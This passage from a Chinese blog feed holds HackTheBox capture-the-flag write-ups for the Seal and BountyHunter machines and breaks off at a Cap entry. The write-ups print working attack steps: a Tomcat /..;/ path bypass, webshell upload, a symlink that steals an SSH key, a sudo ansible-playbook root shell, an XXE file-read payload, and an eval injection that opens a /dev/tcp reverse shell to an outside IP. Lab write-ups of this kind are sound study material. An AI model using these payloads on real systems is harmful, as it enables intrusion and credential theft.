escape_">\x20</span>Dec<span class="hljs-char escape_">\x20</span>2021<span class="hljs-char escape_">\x20</span>01:34:09</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:<span class="hljs-char escape_">\x20</span>JSESSIONID=node01nxswyk2xedhj14uol8ldn80oh154</span><br><span class="hljs-string">SF:\.node0;<span class="hljs-char escape_">\x20</span>Path=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Expires:<span class="hljs-char escape_">\x20</span>Thu,<span class="hljs-char escape_">\x20</span>01<span class="hljs-char escape_">\x20</span>Jan<span class="hljs-char escape_">\x20</span>197</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\x20</span>00:00:00<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>All</span><br><span class="hljs-string">SF:ow:<span class="hljs-char escape_">\x20</span>GET,HEAD,POST,OPTIONS<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRe</span><br><span class="hljs-variable">SF</span>:<span class="hljs-variable">quest</span>,<span class="hljs-variable">AD</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>505<span class="hljs-char escape_">\x20</span>Unknown<span class="hljs-char escape_">\x20</span>Version<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>te</span><br><span class="hljs-string">SF:xt/html;charset=iso-8859-1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>58<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>c</span><br><span class="hljs-string">SF:lose<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;h1&gt;Bad<span class="hljs-char escape_">\x20</span>Message<span class="hljs-char escape_">\x20</span>505&lt;/h1&gt;&lt;pre&gt;reason:<span class="hljs-char escape_">\x20</span>Unknown<span class="hljs-char escape_">\x20</span>Ve</span><br><span class="hljs-string">SF:rsion&lt;/pre&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-variable">F5</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span>Unauthorized\</span><br><span class="hljs-string">SF:r<span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Mon,<span class="hljs-char escape_">\x20</span>13<span class="hljs-char escape_">\x20</span>Dec<span class="hljs-char escape_">\x20</span>2021<span class="hljs-char escape_">\x20</span>01:34:13<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>JSESSIONID=node0z5n4sbc9hnjors2ulsqy6jnq155\.node0;<span class="hljs-char escape_">\x20</span>Path=/;<span class="hljs-char escape_">\x20</span>H</span><br><span class="hljs-string">SF:ttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Expires:<span class="hljs-char escape_">\x20</span>Thu,<span class="hljs-char escape_">\x20</span>01<span class="hljs-char escape_">\x20</span>Jan<span class="hljs-char escape_">\x20</span>1970<span class="hljs-char escape_">\x20</span>00:00:00<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span></span><br><span class="hljs-string">SF:Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span>\</span><br><span class="hljs-string">SF:n&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-variable">C3</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>character<span class="hljs-char escape_">\x20</span>CNTL=0x5<span class="hljs-char escape_">\r</span></span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=iso-8859-1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>6</span><br><span class="hljs-string">SF:9<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;h1&gt;Bad<span class="hljs-char escape_">\x20</span>Message<span class="hljs-char escape_">\x20</span>400&lt;/h1&gt;&lt;pre&gt;rea</span><br><span class="hljs-string">SF:son:<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>character<span class="hljs-char escape_">\x20</span>CNTL=0x5&lt;/pre&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>4,<span class="hljs-variable">C3</span>,<span class="hljs-string">&quot;HTTP/1\.1</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>character<span class="hljs-char escape_">\x20</span>CNTL=0x4<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/ht</span><br><span class="hljs-string">SF:ml;charset=iso-8859-1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>69<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close\</span><br><span class="hljs-string">SF:r<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;h1&gt;Bad<span class="hljs-char escape_">\x20</span>Message<span class="hljs-char escape_">\x20</span>400&lt;/h1&gt;&lt;pre&gt;reason:<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>charact</span><br><span class="hljs-string">SF:er<span class="hljs-char escape_">\x20</span>CNTL=0x4&lt;/pre&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RPCCheck</span>,<span class="hljs-variable">C7</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>ch</span><br><span class="hljs-string">SF:aracter<span class="hljs-char escape_">\x20</span>OTEXT=0x80<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=iso-8859-1\</span><br><span class="hljs-string">SF:r<span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>71<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;h1&gt;Bad<span class="hljs-char escape_">\x20</span>Mess</span><br><span class="hljs-string">SF:age<span class="hljs-char escape_">\x20</span>400&lt;/h1&gt;&lt;pre&gt;reason:<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>character<span class="hljs-char escape_">\x20</span>OTEXT=0x80&lt;/pre&gt;</span><br><span class="hljs-string">SF:&quot;</span>);<br><span class="hljs-title class_">Service</span> <span class="hljs-title class_">Info</span>: <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">linux</span>:<span class="hljs-variable">linux_kernel</span><br><br><span class="hljs-variable">NSE</span>: <span class="hljs-title class_">Script</span> <span class="hljs-title class_">Post</span><span class="hljs-operator">-</span><span class="hljs-variable">scanning</span>.<br><span class="hljs-title class_">Initiating</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span><br><span class="hljs-title class_">Completed</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span>, <span class="hljs-number">0.00</span>s <span class="hljs-variable">elapsed</span><br><span class="hljs-title class_">Initiating</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span><br><span class="hljs-title class_">Completed</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span>, <span class="hljs-number">0.00</span>s <span class="hljs-variable">elapsed</span><br><span class="hljs-title class_">Initiating</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span><br><span class="hljs-title class_">Completed</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span>, <span class="hljs-number">0.00</span>s <span class="hljs-variable">elapsed</span><br><span class="hljs-title class_">Read</span> <span class="hljs-variable">data</span> <span class="hljs-variable">files</span> <span class="hljs-variable">from</span>: /<span class="hljs-variable">usr</span>/<span class="hljs-variable">bin</span>/<span class="hljs-operator">..</span>/<span class="hljs-variable">share</span>/<span class="hljs-variable">nmap</span><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">143.32</span> <span class="hljs-variable">seconds</span><br></code></pre></td></tr></table></figure><h1 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h1><p>可以发现有两个WEB界面，分别如下。一个是gitbucket，另一个是一个商店一样的seal market：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213093829708.png" alt="image-20211213093829708"></p><p>同时还能收集到一个邮箱（后面发现也没啥用）：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213094036799.png" alt="image-20211213094036799"></p><p>在gitbucket中能够看到一个seal的repo，查看其中tomcat配置文件<code>tomcat-user.xml</code>的git变更记录，发现存留的用户名和密码，记录一下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213103229142.png" alt="image-20211213103229142"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;42MrHBf*z8&#123;Z%&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>之后尝试使用该凭据信息进入tomcat控制台上传war包。首先是使用dirsearch扫一下目录：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213122223530.png" alt="image-20211213122223530"></p><p>可以发现本该是控制台的<code>/manager/html</code>是403，访问该界面能够看到nginx的界面。不难推测是nginx是作为反向代理服务器，之后流量才转发给后端的tomcat。且nginx的location块应该作了相应的配置从而使得不能访问控制台。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213123304807.png" alt="image-20211213123304807"></p><p>那就是需要想办法绕过了，其实现阶段爆出的很多漏洞中，反向代理在解析的时候和后端出现不一致的情况经常是会被拿来做文章的地方。据此搜索的话，最终我们能够找到一个目录穿越漏洞。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213123401130.png" alt="image-20211213123401130"></p><p>第一个AWVS的链接中，我们可以发现一个存在不一致的情况。大体就是tomcat会将<code>/..;/</code>解析成传统意义上的<code>/../</code>，而nginx不会。所以nginx放过了本该拦截的URL访问，这样我们就能进入控制台了。</p><blockquote><p>Web servers and reverse proxies normalize the request path. For example, the path <strong>&#x2F;image&#x2F;..&#x2F;image&#x2F;</strong> is normalized to <strong>&#x2F;images&#x2F;</strong>. When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency.</p><p>Tomcat will threat the sequence <strong>&#x2F;..;&#x2F;</strong> as <strong>&#x2F;..&#x2F;</strong> and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.</p><p>This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping.</p></blockquote><p>如上，我们访问如下链接就能进入tomcat的管理员界面：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.250</span><span class="hljs-regexp">/manager/</span>status<span class="hljs-regexp">/..;/</span>html<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213183540308.png" alt="image-20211213183540308"></p><p>之后就是非常传统的通过上传war包getshell了，需要注意的是在上传时候访问的URL依旧需要抓包改包，否则依然会是403.</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213184203717.png" alt="image-20211213184203717"></p><p>这里传的是冰蝎马，经过测试平常默认使用的jsp冰蝎马会解析错误。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213195314377.png" alt="image-20211213195314377"></p><p>换了一个低版本的java9的jsp webshell就行了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213194049298.png" alt="image-20211213194049298"></p><p>拿到shell后首先敲下命令看下权限，发现是非常普通的tomcat。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213195352058.png" alt="image-20211213195352058"></p><h1 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h1><p>逛了一圈没有发现比较特殊的东西，ssh私钥也读不了。遂上传linpeas脚本后运行，发现网站的备份文件。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213201832397.png" alt="image-20211213201832397"></p><p>在backup目录下发现playbook配置文件，可以发现有一个copy_link的敏感配置，这是我们可以利用的突破口。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213213033000.png" alt="image-20211213213033000"></p><p>我们可以创建一个软连接，指向luis用户的ssh私钥，这样备份的时候就能复制出来了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s  /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa<br></code></pre></td></tr></table></figure><p>用冰蝎将文件下载到本地，解压打开即可拿到用户luis的私钥。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213213332563.png" alt="image-20211213213332563"></p><p>更改权限为600后登陆之，登陆成功后即可拿到user.txt。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213205338524.png" alt="image-20211213205338524"></p><p>root的提权还是通过playbook。gtfobins中给出了通过playbook进行提权的脚本。当然也可以自己写一个。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213213533039.png" alt="image-20211213213533039"></p><p>命令粘贴如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[&#123;hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]&#125;]&#x27;</span> &gt;<span class="hljs-variable">$TF</span><br>sudo ansible-playbook <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><p>运行后即可拿到root的shell，读root.txt即可。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213210347993.png" alt="image-20211213210347993"></p><h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Medium难度的Linux靶机，主要考察内容如下：</p><ul><li>tomcat路径穿越绕过</li><li>playbook应用滥用</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - BountyHunter</title>
    <link href="/2021/12/07/HTB/BountyHunter/"/>
    <url>/2021/12/07/HTB/BountyHunter/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>端口信息</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905162026669.png" alt="image-20210905162026669"></p><p>目录扫描</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905161800851.png" alt="image-20210905161800851"></p><h1 id="0x02-打靶"><a href="#0x02-打靶" class="headerlink" title="0x02 打靶"></a>0x02 打靶</h1><p>一通乱点后来到一个后台地址：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123140302.png" alt="image-20210905123140302"></p><p>提交后在burp中能够发现网站和后台通信的数据：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123307253.png" alt="image-20210905123307253"></p><p>进行URL解码和BASE64解码后发现是xml：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123338095.png" alt="image-20210905123338095"></p><p>于是可以试试XXE，首先读取文件：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123403065.png" alt="image-20210905123403065"></p><p>成功了，接下来可以试试读取别的文件：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123428344.png" alt="image-20210905123428344"></p><p>但是该读什么文件呢，在之前的扫描目录可以发现<code>db.php</code>，于是尝试读取<code>db.php</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/db.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">    ]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bugreport</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>dfg<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cwe</span>&gt;</span>dfg<span class="hljs-tag">&lt;/<span class="hljs-name">cwe</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cvss</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">cvss</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">reward</span>&gt;</span>dfg<span class="hljs-tag">&lt;/<span class="hljs-name">reward</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bugreport</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在拿到Base64字符串后拿去解码，可以拿到账户和密码：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905124114252.png" alt="image-20210905124114252"></p><p>但是之前的扫描端口发现数据库并没有开放外联，但总归是拿到了敏感信息的。然后还开放了<code>ssh</code>，我们可以试着去撞库。</p><p>这里我们可以使用<code>/etc/passwd</code>中拿到的账户做字典去跑。但是用户数量比较少我就选择了一个个试，最后试出了<code>development</code>账户：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905130216528.png" alt="image-20210905130216528"></p><h1 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h1><p>在进行一些信息收集后，我使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p>发现存在某个校验票据的脚本：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905130456254.png" alt="image-20210905130456254"></p><p>查看该脚本，该脚本是只读的。但是能够发现脚本使用了危险的函数<code>eval</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905131218741.png" alt="image-20210905131218741"></p><p>关键函数截取如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">ticketFile</span>):<br>    <span class="hljs-comment">#Evaluates a ticket to check for ireggularities.</span><br>    code_line = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> i,x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ticketFile.readlines()):<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.startswith(<span class="hljs-string">&quot;# Skytrain Inc&quot;</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.startswith(<span class="hljs-string">&quot;## Ticket to &quot;</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Destination: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27; &#x27;</span>.join(x.strip().split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">3</span>:])&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> x.startswith(<span class="hljs-string">&quot;__Ticket Code:__&quot;</span>):<br>            code_line = i+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> code_line <span class="hljs-keyword">and</span> i == code_line:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.startswith(<span class="hljs-string">&quot;**&quot;</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            ticketCode = x.replace(<span class="hljs-string">&quot;**&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;+&quot;</span>)[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(ticketCode) % <span class="hljs-number">7</span> == <span class="hljs-number">4</span>:<br>                validationNumber = <span class="hljs-built_in">eval</span>(x.replace(<span class="hljs-string">&quot;**&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br></code></pre></td></tr></table></figure><p>逻辑很好理解，我们需要根据代码执行逻辑一步步走直到<code>eval</code>被执行。于是最后的payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Skytrain Inc</span><br><span class="hljs-comment">## Ticket to </span><br>__Ticket Code:__<br>**11+10==__import__(<span class="hljs-string">&#x27;subprocess&#x27;</span>).call(<span class="hljs-string">&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/10.10.14.46/2333 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x&quot;</span>,shell=True)<br></code></pre></td></tr></table></figure><p>执行命令并开启监听，即可拿到shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py<br></code></pre></td></tr></table></figure><p>拿到root的shell后在家目录下即可拿到secret：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905160136136.png" alt="image-20210905160136136"></p><h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="https://blog.csdn.net/whatday/article/details/102748376">https://blog.csdn.net/whatday/article/details/102748376</a></p><h1 id="0x05-Summary"><a href="#0x05-Summary" class="headerlink" title="0x05 Summary"></a>0x05 Summary</h1><p>这是一个Easy难度的Linux靶机，主要考察内容如下：</p><ul><li>XXE</li><li>滥用脚本文件</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Cap</title>
    <link href="/2021/12/07/HTB/Cap/"/>
    <url>/2021/12/07/HTB/Cap/</url>
    
